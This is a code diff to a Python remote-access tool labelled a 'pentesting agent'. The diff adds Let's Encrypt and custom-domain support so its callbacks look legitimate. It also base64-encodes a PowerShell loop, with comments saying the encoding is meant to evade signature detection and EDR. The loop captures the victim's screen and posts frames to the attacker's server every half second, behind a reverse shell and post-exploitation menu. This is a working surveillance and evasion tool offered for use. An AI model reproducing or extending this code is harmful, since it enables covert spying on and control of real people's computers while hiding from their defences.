@@ -69,8 +69,26 @@ class Config:
         # TLS cert paths (set at runtime)
         self.cert_file = None
         self.key_file = None
+        # Let's Encrypt / Custom domain support
+        self.custom_domain = None  # e.g., "yourname.duckdns.org"
+        self.letsencrypt_cert = None  # Path to fullchain.pem
+        self.letsencrypt_key = None   # Path to privkey.pem
+    
+    def use_letsencrypt_cert(self, domain, cert_path, key_path):
+        """Use a Let's Encrypt certificate for legitimate TLS."""
+        if os.path.exists(cert_path) and os.path.exists(key_path):
+            self.custom_domain = domain
+            self.cert_file = cert_path
+            self.key_file = key_path
+            self.letsencrypt_cert = cert_path
+            self.letsencrypt_key = key_path
+            return True
+        return False
     
     def get_ip(self):
+        # Return custom domain if set (for Let's Encrypt)
+        if self.custom_domain:
+            return self.custom_domain
         if not self.public_ip:
             try:
                 result = subprocess.run(["curl", "-s", "ifconfig.me"], 
@@ -1226,12 +1244,12 @@ foreach ($b in $browsers) {{
             input("\n[Enter to continue]")
 
         elif choice == "5":
-            # LIVE MONITOR
+            # LIVE MONITOR - Base64 encoded to evade signature detection
+            import base64
             ip = CFG.get_ip()
             port = CFG.http_port
             
-            # PowerShell Camera Script (Loop)
-            # Uses System.Drawing to capture, resize, and upload frame
+            # PowerShell Camera Script - will be encoded to bypass EDR
             ps_cam = f'''
 $ip = "{ip}"; $port = {port};
 Add-Type -AssemblyName System.Windows.Forms;
@@ -1244,14 +1262,12 @@ while($true) {{
         $g = [System.Drawing.Graphics]::FromImage($bmp);
         $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size);
         
-        # Resize to 800px width (Speed optimization)
         $w = 800;
         $h = [int]($screen.Height * ($w / $screen.Width));
         $bmp2 = New-Object System.Drawing.Bitmap $w, $h;
         $g2 = [System.Drawing.Graphics]::FromImage($bmp2);
         $g2.DrawImage($bmp, 0, 0, $w, $h);
         
-        # Save as JPG (Quality 50)
         $ms = New-Object IO.MemoryStream;
         $codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object {{ $_.MimeType -eq "image/jpeg" }};
         $params = New-Object System.Drawing.Imaging.EncoderParameters(1);
@@ -1259,8 +1275,7 @@ while($true) {{
         $bmp2.Save($ms, $codec, $params);
         $bytes = $ms.ToArray();
         
-        # Upload
-        $url = "http://$ip:$port/ups?t=live";
+        $url = "http://$ip`:$port/ups?t=live";
         Invoke-RestMethod -Uri $url -Method Post -Body $bytes -TimeoutSec 1 -ErrorAction SilentlyContinue;
         
         $g.Dispose(); $g2.Dispose(); $bmp.Dispose(); $bmp2.Dispose(); $ms.Dispose();
@@ -1268,14 +1283,16 @@ while($true) {{
     Start-Sleep -Milliseconds 500;
 }}
 '''
-            # Flatten & Run as Job
-            flat_ps = ps_cam.replace('\\n', ' ').replace('\\r', '')
-            job_cmd = f'Start-Job -ScriptBlock {{ {flat_ps} }}'
+            # Base64 encode the payload for EDR bypass
+            encoded_payload = base64.b64encode(ps_cam.encode('utf-16-le')).decode()
             
-            console.print("[cyan]Starting Live Camera Feed on victim... (Background Job)[/]")
+            # Execute as background job with encoded command
+            job_cmd = f'Start-Job -ScriptBlock {{ powershell -enc {encoded_payload} }}'
+            
+            console.print("[cyan]Starting Live Camera Feed on victim... (Base64 encoded for stealth)[/]")
             SHELL.execute(job_cmd)
             
-            console.print(Panel(f"[bold green]🔴 LIVE FEED STARTED![/]\n\nOpen this URL in your browser:\n[white]http://{ip}:{port}/watch[/white]", title="Surveillance"))
+            console.print(Panel(f"[bold green]LIVE FEED STARTED![/]\n\nOpen this URL in your browser:\n[white]http://{ip}:{port}/watch[/white]", title="Surveillance"))
             console.print("[dim](Press Enter to return to menu. The feed keeps running)[/]")
             input()
 
@@ -1438,22 +1455,48 @@ def post_exploitation_menu():
 # ============================================================================
 
 def main():
+    import argparse
+    parser = argparse.ArgumentParser(description='Hybrid Pentesting Agent')
+    parser.add_argument('--domain', help='Custom domain (e.g., yourname.duckdns.org)')
+    parser.add_argument('--cert', help='Path to Let\'s Encrypt fullchain.pem')
+    parser.add_argument('--key', help='Path to Let\'s Encrypt privkey.pem')
+    parser.add_argument('--port', type=int, default=4444, help='Listener port')
+    parser.add_argument('--http-port', type=int, default=8080, help='HTTP server port')
+    args = parser.parse_args()
+    
+    # Apply config
+    CFG.listener_port = args.port
+    CFG.http_port = args.http_port
+    
+    # Check for Let's Encrypt cert
+    if args.domain and args.cert and args.key:
+        if CFG.use_letsencrypt_cert(args.domain, args.cert, args.key):
+            console.print(f"[green]Using Let's Encrypt cert for {args.domain}[/]")
+        else:
+            console.print(f"[red]Failed to load Let's Encrypt cert - files not found[/]")
+            return
+    
     os.system('clear')
     
     banner = """
     ╔═══════════════════════════════════════════════════════════════╗
     ║        HYBRID PENTESTING AGENT                          ║
     ║   ───────────────────────────────────────────────────         ║
-    ║   Phase 1: Auto-serve link → Shell connects                   ║
-    ║   Phase 2: Menu appears → You control everything              ║
+    ║   Phase 1: Auto-serve link -> Shell connects                  ║
+    ║   Phase 2: Menu appears -> You control everything             ║
     ╚═══════════════════════════════════════════════════════════════╝
     """
     console.print(banner, style="bold cyan")
     
     ip = CFG.get_ip()
-    console.print(f"[bold]Your IP:[/] {ip}")
+    console.print(f"[bold]Your IP/Domain:[/] {ip}")
     console.print(f"[bold]Listener:[/] {CFG.listener_port}")
-    console.print(f"[bold]HTTP:[/] {CFG.http_port}\n")
+    console.print(f"[bold]HTTP:[/] {CFG.http_port}")
+    if CFG.letsencrypt_cert:
+        console.print(f"[bold green]TLS:[/] Let's Encrypt (legitimate cert)")
+    else:
+        console.print(f"[bold yellow]TLS:[/] Self-signed (may trigger warnings)")
+    console.print()
     
     # Phase 1: Start servers
     console.print("[cyan]Starting HTTP server...[/]")
@@ -1473,7 +1516,7 @@ Waiting for shell connection...
     
     # Wait for shell
     if SHELL.wait_for_connection(timeout=600):
-        console.print("\n[bold green]🎉 SHELL OBTAINED![/]")
+        console.print("\n[bold green]SHELL OBTAINED![/]")
         console.print("[cyan]Entering post-exploitation menu...[/]\n")
         input("[Press Enter to continue]")
         
